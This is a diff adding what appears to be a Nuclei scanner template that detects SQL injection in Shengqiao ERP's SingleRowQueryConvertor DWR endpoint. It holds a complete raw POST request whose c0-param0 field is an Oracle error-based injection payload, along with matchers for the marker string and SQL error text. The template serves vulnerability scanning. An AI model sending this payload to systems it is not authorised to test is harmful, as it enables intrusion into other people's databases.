@@ -1,0 +1,34 @@
+id: shengqiao-erp-singlerowqueryconvertor-sqli
+info:
+  name: Shengqiao ERP SingleRowQueryConvertor SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /erp/dwr/call/plaincall/SingleRowQueryConvertor.queryForString.dwr HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+
+        callCount=1
+        page=/erp/dwr/test/SingleRowQueryConvertor
+        httpSessionId=
+        scriptSessionId=D528B0534A8BE018344AB2D54E02931D86
+        c0-scriptName=SingleRowQueryConvertor
+        c0-methodName=queryForString
+        c0-id=0
+        c0-param0=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(122)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (99=99) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(122)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)
+        c0-param1=Array:[]
+        batchId=0
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "qjzzq1qvzvq"
+          - "SYS.XMLTYPE"
+          - "java.sql.SQLException"
+        part: body
